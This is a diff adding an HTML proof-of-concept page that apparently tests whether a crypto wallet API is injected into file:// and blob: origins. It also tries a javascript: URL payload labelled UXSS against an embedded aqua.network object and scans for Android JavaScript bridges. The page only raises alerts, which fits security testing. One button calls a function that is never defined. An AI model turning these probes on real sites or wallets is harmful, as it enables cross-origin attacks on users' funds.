@@ -1,9 +1,25 @@
+<!DOCTYPE html>
+<html><body style="background:#0a0a0b;color:#0f0;font-family:monospace;padding:16px">
+<div id="mainLog"></div>
+<button onclick="testCurrent()">TEST CURRENT ORIGIN</button>
+<button onclick="testPrivateFiles()">TEST PRIVATE FILES</button>
+<button onclick="testBlob()">CREATE BLOB URL</button>
+<object id="obj" data="https://aqua.network" width="100%" height="150"></object>
+<button onclick="testObject()">TRIGGER UXSS OBJECT</button>
+<button onclick="testBridge()">SCAN BRIDGES</button>
 <script>
-function testBlob(){
-  const html = `<script>document.write('origin:'+location.origin+' freighterApi:'+!!window.freighterApi)<\/script>`;
-  const blob = new Blob([html], {type:'text/html'});
-  const url = URL.createObjectURL(blob);
-  window.open(url);
+function testCurrent(){
+  console.log('protocol',location.protocol,'freighterApi?',!!window.freighterApi);
+  if(location.protocol==='file:' && window.freighterApi) alert('HIGH: file:// injected!');
 }
-// Kalau di blob:null freighterApi? true = HIGH
-</script>
+function testBlob(){
+  const html=`<script>if(window.freighterApi)alert('HIGH blob injected')<\/script>`;
+  window.open(URL.createObjectURL(new Blob([html],{type:'text/html'})));
+}
+function testObject(){
+  document.getElementById('obj').data='javascript:alert("UXSS "+document.domain)';
+}
+function testBridge(){
+  for(let k in window) if(k.toLowerCase().includes('android')) alert('Bridge: '+k);
+}
+</script></body></html>
